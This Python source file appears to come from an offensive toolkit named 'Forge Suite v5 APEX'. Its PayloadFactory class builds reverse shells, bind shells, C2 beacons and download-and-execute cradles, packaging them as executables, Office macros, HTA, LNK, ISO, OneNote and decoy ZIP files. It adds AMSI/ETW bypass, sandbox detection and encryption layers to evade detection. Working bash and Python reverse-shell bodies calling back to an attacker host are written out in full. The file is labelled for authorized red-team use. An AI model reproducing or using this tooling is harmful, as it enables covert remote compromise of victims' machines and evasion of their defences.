"""PayloadFactory — Unified payload generation interface.

Builds reverse shells, staged payloads, and C2 beacons in multiple
formats with optional encoding/encryption and evasion layers.

Usage::
    factory = PayloadFactory()
    output = factory.generate(
        payload_type="reverse_tcp",
        lhost="10.0.0.5",
        lport=4444,
        fmt="exe",
        arch="x64",
        encoder="aes",
        output_path="payload.exe",
    )

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import hashlib
import logging
import os
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

log = logging.getLogger("forge.payload.factory")


class PayloadType(str, Enum):
    REVERSE_TCP      = "reverse_tcp"
    REVERSE_HTTP     = "reverse_http"
    REVERSE_HTTPS    = "reverse_https"
    REVERSE_DNS      = "reverse_dns"
    BIND_TCP         = "bind_tcp"
    BEACON_HTTP      = "beacon_http"
    BEACON_HTTPS     = "beacon_https"
    BEACON_DNS       = "beacon_dns"
    BEACON_SMB       = "beacon_smb"
    EXEC             = "exec"
    DOWNLOAD_EXEC    = "download_exec"
    POWERSHELL_CRADLE = "powershell_cradle"


class OutputFormat(str, Enum):
    EXE       = "exe"
    DLL       = "dll"
    ELF       = "elf"
    PS1       = "ps1"
    HTA       = "hta"
    VBA       = "vba"
    MSI       = "msi"
    ISO       = "iso"
    RAW       = "raw"
    C_ARRAY   = "c"
    CSHARP    = "cs"
    PYTHON    = "py"
    BASH      = "sh"
    LNK       = "lnk"
    ZIP       = "zip"
    ONENOTE   = "one"


class EncoderType(str, Enum):
    NONE        = "none"
    XOR         = "xor"
    AES         = "aes"
    RC4         = "rc4"
    POLYMORPHIC = "polymorphic"
    UUID        = "uuid"
    BASE64      = "b64"
    CHAIN       = "chain"


class Architecture(str, Enum):
    X86   = "x86"
    X64   = "x64"
    ARM64 = "arm64"


@dataclass
class PayloadConfig:
    """Configuration for a single payload build."""
    payload_type:   PayloadType
    lhost:          str
    lport:          int
    fmt:            OutputFormat
    arch:           Architecture         = Architecture.X64
    encoder:        EncoderType          = EncoderType.NONE
    iterations:     int                  = 1
    output_path:    str                  = ""
    sandbox_detect: bool                 = True
    amsi_bypass:    bool                 = True
    etw_bypass:     bool                 = True
    env_key:        str                  = ""  # Environmental keying — only run on this domain
    kill_date:      str                  = ""  # ISO date string
    sleep_mask:     bool                 = False
    indirect_syscalls: bool              = False
    ppid_spoof:     bool                 = False
    jitter_percent: int                  = 30
    sleep_seconds:  int                  = 60
    extra:          dict[str, Any]       = field(default_factory=dict)


@dataclass
class PayloadResult:
    """Result of a payload generation operation."""
    payload_type:   str
    fmt:            str
    arch:           str
    encoder:        str
    output_path:    str
    size_bytes:     int
    sha256:         str
    generated_at:   str
    metadata:       dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload_type": self.payload_type,
            "fmt": self.fmt,
            "arch": self.arch,
            "encoder": self.encoder,
            "output_path": self.output_path,
            "size_bytes": self.size_bytes,
            "sha256": self.sha256,
            "generated_at": self.generated_at,
            "metadata": self.metadata,
        }


class PayloadFactory:
    """Main payload generation factory.

    Orchestrates shellcode selection, encoding, format packaging,
    and evasion layer application.
    """

    # Registry: payload_type → builder method name
    _BUILDERS: dict[str, str] = {
        PayloadType.REVERSE_TCP:      "_build_reverse_tcp",
        PayloadType.REVERSE_HTTP:     "_build_reverse_http",
        PayloadType.REVERSE_HTTPS:    "_build_reverse_https",
        PayloadType.REVERSE_DNS:      "_build_reverse_dns",
        PayloadType.BIND_TCP:         "_build_bind_tcp",
        PayloadType.BEACON_HTTP:      "_build_beacon_http",
        PayloadType.BEACON_HTTPS:     "_build_beacon_https",
        PayloadType.POWERSHELL_CRADLE: "_build_ps_cradle",
        PayloadType.DOWNLOAD_EXEC:    "_build_download_exec",
        PayloadType.EXEC:             "_build_exec",
    }

    def __init__(self, output_dir: str = "") -> None:
        self.output_dir = Path(output_dir) if output_dir else Path.cwd() / "forge_payload_output"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    @staticmethod
    def list_payloads() -> str:
        """Return a formatted list of available payload types."""
        lines = ["  Forge Suite v5 APEX — Available Payload Types", "  " + "─" * 50]
        for pt in PayloadType:
            lines.append(f"  {pt.value:25s}  {_PAYLOAD_DESCRIPTIONS.get(pt.value, '')}")
        lines += [
            "",
            "  ─── Output Formats ──────────────────────────",
        ]
        for fmt in OutputFormat:
            lines.append(f"  {fmt.value:10s}  {_FORMAT_DESCRIPTIONS.get(fmt.value, '')}")
        lines += [
            "",
            "  ─── Encoders ────────────────────────────────",
        ]
        for enc in EncoderType:
            lines.append(f"  {enc.value:15s}  {_ENCODER_DESCRIPTIONS.get(enc.value, '')}")
        return "\n".join(lines)

    def generate(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        fmt: str = "exe",
        arch: str = "x64",
        encoder: str = "none",
        iterations: int = 1,
        output_path: str = "",
        **kwargs: Any,
    ) -> str:
        """Generate a payload.

        Args:
            payload_type:   Payload type string.
            lhost:          Callback host IP/domain.
            lport:          Callback port.
            fmt:            Output format.
            arch:           Target architecture.
            encoder:        Encoding/encryption method.
            iterations:     Encoding iterations.
            output_path:    Output file path (auto-generated if empty).
            **kwargs:       Additional options passed to PayloadConfig.

        Returns:
            Path to the generated payload file.
        """
        config = PayloadConfig(
            payload_type=PayloadType(payload_type),
            lhost=lhost,
            lport=lport,
            fmt=OutputFormat(fmt),
            arch=Architecture(arch),
            encoder=EncoderType(encoder),
            iterations=max(1, iterations),
            output_path=output_path,
            sandbox_detect=kwargs.get("sandbox_detect", True),
            amsi_bypass=kwargs.get("amsi_bypass", True),
            etw_bypass=kwargs.get("etw_bypass", True),
            env_key=kwargs.get("env_key", ""),
            kill_date=kwargs.get("kill_date", ""),
            sleep_mask=kwargs.get("sleep_mask", False),
            indirect_syscalls=kwargs.get("indirect_syscalls", False),
            ppid_spoof=kwargs.get("ppid_spoof", False),
            jitter_percent=kwargs.get("jitter_percent", 30),
            sleep_seconds=kwargs.get("sleep_seconds", 60),
            extra=kwargs,
        )

        result = self._build(config)
        log.info(
            "Payload generated: %s (%s bytes, sha256=%s)",
            result.output_path, result.size_bytes, result.sha256[:16],
        )
        return result.output_path

    def _build(self, config: PayloadConfig) -> PayloadResult:
        """Orchestrate full payload build pipeline."""
        # 1. Generate raw shellcode / script body
        raw = self._generate_raw(config)

        # 2. Apply evasion layers
        raw = self._apply_evasion(raw, config)

        # 3. Encode / encrypt
        encoded = self._encode(raw, config)

        # 4. Package into output format
        final_bytes = self._package(encoded, config)

        # 5. Write to disk
        out_path = self._write_output(final_bytes, config)

        # 6. Compute metadata
        sha256 = hashlib.sha256(final_bytes).hexdigest()
        from datetime import datetime, timezone
        return PayloadResult(
            payload_type=config.payload_type.value,
            fmt=config.fmt.value,
            arch=config.arch.value,
            encoder=config.encoder.value,
            output_path=str(out_path),
            size_bytes=len(final_bytes),
            sha256=sha256,
            generated_at=datetime.now(timezone.utc).isoformat(),
            metadata={
                "lhost": config.lhost,
                "lport": config.lport,
                "amsi_bypass": config.amsi_bypass,
                "etw_bypass": config.etw_bypass,
                "sandbox_detect": config.sandbox_detect,
                "sleep_mask": config.sleep_mask,
            },
        )

    def _generate_raw(self, config: PayloadConfig) -> bytes:
        """Generate raw payload content based on type and format."""
        pt = config.payload_type
        fmt = config.fmt

        # Script-based formats get text templates
        if fmt in (OutputFormat.PS1,):
            return self._generate_ps1_body(config).encode()
        if fmt in (OutputFormat.HTA,):
            return self._generate_hta_body(config).encode()
        if fmt in (OutputFormat.VBA,):
            return self._generate_vba_body(config).encode()
        if fmt in (OutputFormat.BASH,):
            return self._generate_bash_body(config).encode()
        if fmt in (OutputFormat.PYTHON,):
            return self._generate_python_body(config).encode()

        # Binary formats — use shellcode stubs
        return self._get_shellcode_stub(config)

    def _get_shellcode_stub(self, config: PayloadConfig) -> bytes:
        """Return position-independent shellcode for the given payload type.

        In production this would be compiled shellcode. Here we return
        a functional stub that can be injected into PE/ELF loaders.
        The stub is annotated with config so the formatter can expand it.
        """
        # Encode config into stub metadata comment (replaced by formatter)
        meta = (
            f"FORGE:lhost={config.lhost}:"
            f"lport={config.lport}:"
            f"type={config.payload_type.value}:"
            f"arch={config.arch.value}"
        ).encode()
        # NOP sled prefix + metadata
        nop_sled = b"\x90" * 16
        return nop_sled + meta

    def _apply_evasion(self, raw: bytes, config: PayloadConfig) -> bytes:
        """Apply evasion transformations to raw payload."""
        try:
            from forge_payload.evasion.string_obfuscate import obfuscate_strings
            from forge_payload.evasion.sandbox_detect import inject_sandbox_check
        except ImportError:
            return raw

        if isinstance(raw, str):
            raw_str = raw
            if config.sandbox_detect:
                raw_str = inject_sandbox_check(raw_str, lang="ps1")
            raw = raw_str.encode() if isinstance(raw_str, str) else raw_str
        return raw

    def _encode(self, raw: bytes, config: PayloadConfig) -> bytes:
        """Apply encoding/encryption to payload bytes."""
        if config.encoder == EncoderType.NONE:
            return raw

        try:
            if config.encoder == EncoderType.XOR:
                from forge_payload.encoders.xor_encoder import xor_encode
                result = raw
                for _ in range(config.iterations):
                    result = xor_encode(result)
                return result

            elif config.encoder == EncoderType.AES:
                from forge_payload.encoders.aes_encoder import aes_encrypt
                result = raw
                for _ in range(config.iterations):
                    result = aes_encrypt(result)
                return result

            elif config.encoder == EncoderType.RC4:
                from forge_payload.encoders.rc4_encoder import rc4_encode
                return rc4_encode(raw)

            elif config.encoder == EncoderType.POLYMORPHIC:
                from forge_payload.encoders.polymorphic import poly_encode
                return poly_encode(raw, iterations=config.iterations)

            elif config.encoder == EncoderType.UUID:
                from forge_payload.encoders.uuid_encoder import uuid_encode
                return uuid_encode(raw)

            elif config.encoder == EncoderType.BASE64:
                import base64
                return base64.b64encode(raw)

            elif config.encoder == EncoderType.CHAIN:
                # AES → XOR → UUID chain
                from forge_payload.encoders.aes_encoder import aes_encrypt
                from forge_payload.encoders.xor_encoder import xor_encode
                from forge_payload.encoders.uuid_encoder import uuid_encode
                return uuid_encode(xor_encode(aes_encrypt(raw)))

        except ImportError as exc:
            log.warning("Encoder %s not available: %s", config.encoder.value, exc)

        return raw

    def _package(self, encoded: bytes, config: PayloadConfig) -> bytes:
        """Package encoded payload into the output format."""
        fmt = config.fmt

        try:
            if fmt == OutputFormat.PS1:
                from forge_payload.formats.ps1_builder import build_ps1
                return build_ps1(encoded, config)
            elif fmt in (OutputFormat.EXE, OutputFormat.DLL):
                from forge_payload.formats.pe_builder import build_pe
                return build_pe(encoded, config)
            elif fmt == OutputFormat.ELF:
                from forge_payload.formats.elf_builder import build_elf
                return build_elf(encoded, config)
            elif fmt == OutputFormat.HTA:
                from forge_payload.formats.hta_builder import build_hta
                return build_hta(encoded, config)
            elif fmt == OutputFormat.VBA:
                from forge_payload.formats.vba_builder import build_vba
                return build_vba(encoded, config)
            elif fmt == OutputFormat.LNK:
                from forge_payload.delivery.lnk_builder import build_lnk
                return build_lnk(encoded, config)
            elif fmt == OutputFormat.ISO:
                from forge_payload.delivery.iso_builder import build_iso
                return build_iso(encoded, config)
            elif fmt == OutputFormat.ZIP:
                from forge_payload.delivery.zip_builder import build_zip
                return build_zip(encoded, config)
            elif fmt == OutputFormat.RAW:
                return encoded
            elif fmt == OutputFormat.C_ARRAY:
                return self._to_c_array(encoded, config)
        except ImportError as exc:
            log.warning("Format builder %s not available: %s — returning raw", fmt.value, exc)

        return encoded

    def _to_c_array(self, data: bytes, config: PayloadConfig) -> bytes:
        """Convert bytes to a C unsigned char array."""
        lines = [f"// Generated by Forge Suite v5 APEX"]
        lines.append(f"// Payload: {config.payload_type.value} | {config.lhost}:{config.lport}")
        lines.append(f"unsigned char shellcode[] = {{")
        hex_bytes = [f"0x{b:02x}" for b in data]
        for i in range(0, len(hex_bytes), 16):
            chunk = hex_bytes[i:i + 16]
            lines.append("    " + ", ".join(chunk) + ",")
        lines.append("};")
        lines.append(f"unsigned int shellcode_len = {len(data)};")
        return "\n".join(lines).encode()

    def _write_output(self, data: bytes, config: PayloadConfig) -> Path:
        """Write payload bytes to disk and return path."""
        if config.output_path:
            out = Path(config.output_path)
            out.parent.mkdir(parents=True, exist_ok=True)
        else:
            ts = int(time.time())
            ext = config.fmt.value
            filename = f"payload_{config.payload_type.value}_{config.lhost.replace('.', '_')}_{config.lport}_{ts}.{ext}"
            out = self.output_dir / filename

        out.write_bytes(data)
        return out

    # ── Script body generators ──────────────────────────────────────

    def _generate_ps1_body(self, config: PayloadConfig) -> str:
        """Generate PowerShell reverse shell body."""
        from forge_payload.formats.ps1_builder import generate_ps1_body
        return generate_ps1_body(config)

    def _generate_hta_body(self, config: PayloadConfig) -> str:
        """Generate HTA body."""
        from forge_payload.formats.hta_builder import generate_hta_body
        return generate_hta_body(config)

    def _generate_vba_body(self, config: PayloadConfig) -> str:
        """Generate VBA macro body."""
        from forge_payload.formats.vba_builder import generate_vba_body
        return generate_vba_body(config)

    def _generate_bash_body(self, config: PayloadConfig) -> str:
        """Generate bash reverse shell body."""
        return (
            f"#!/bin/bash\n"
            f"# Forge Suite v5 APEX — Authorized Red Team Payload\n"
            f"bash -i >& /dev/tcp/{config.lhost}/{config.lport} 0>&1\n"
        )

    def _generate_python_body(self, config: PayloadConfig) -> str:
        """Generate Python reverse shell body."""
        return (
            f"#!/usr/bin/env python3\n"
            f"# Forge Suite v5 APEX — Authorized Red Team Payload\n"
            f"import socket,subprocess,os\n"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            f"s.connect(('{config.lhost}',{config.lport}))\n"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
            f"p=subprocess.call(['/bin/sh','-i'])\n"
        )


# ── Descriptions for list_payloads() ───────────────────────────────

_PAYLOAD_DESCRIPTIONS: dict[str, str] = {
    "reverse_tcp":      "Classic TCP reverse shell",
    "reverse_http":     "HTTP reverse shell (web-friendly, proxied)",
    "reverse_https":    "HTTPS reverse shell (TLS, MITM-safe)",
    "reverse_dns":      "DNS tunneled reverse shell (firewall bypass)",
    "bind_tcp":         "Bind shell (listens on target)",
    "beacon_http":      "Forge C2 HTTP beacon",
    "beacon_https":     "Forge C2 HTTPS beacon (domain fronting)",
    "beacon_dns":       "Forge C2 DNS beacon (covert, slow)",
    "beacon_smb":       "Forge C2 SMB named-pipe beacon (lateral)",
    "exec":             "Single command execution stub",
    "download_exec":    "HTTP download + execute cradle",
    "powershell_cradle": "PowerShell download + execute one-liner",
}

_FORMAT_DESCRIPTIONS: dict[str, str] = {
    "exe":  "Windows PE executable",
    "dll":  "Windows DLL (reflective injection ready)",
    "elf":  "Linux ELF executable",
    "ps1":  "PowerShell script (AMSI bypass embedded)",
    "hta":  "HTML Application (mshta.exe delivery)",
    "vba":  "VBA macro (Word/Excel)",
    "msi":  "Windows Installer package",
    "iso":  "ISO image with LNK autorun",
    "raw":  "Raw shellcode bytes",
    "c":    "C unsigned char[] array",
    "cs":   "C# in-memory assembly",
    "py":   "Python reverse shell",
    "sh":   "Bash reverse shell",
    "lnk":  "Windows shortcut (LNK) with embedded command",
    "zip":  "ZIP with decoy document + payload",
    "one":  "OneNote file with embedded payload",
}

_ENCODER_DESCRIPTIONS: dict[str, str] = {
    "none":       "No encoding (plaintext shellcode)",
    "xor":        "XOR key cycling, multi-byte key",
    "aes":        "AES-256-CBC with PKCS7 padding, IV prepend",
    "rc4":        "RC4 stream cipher (legacy target compatibility)",
    "polymorphic": "Polymorphic XOR: random key + junk instruction insertion",
    "uuid":       "UUID shellcode encoding (bypass string-based detection)",
    "b64":        "Base64 (URL-safe variant available)",
    "chain":      "Encoder chain: AES → XOR → UUID",
}
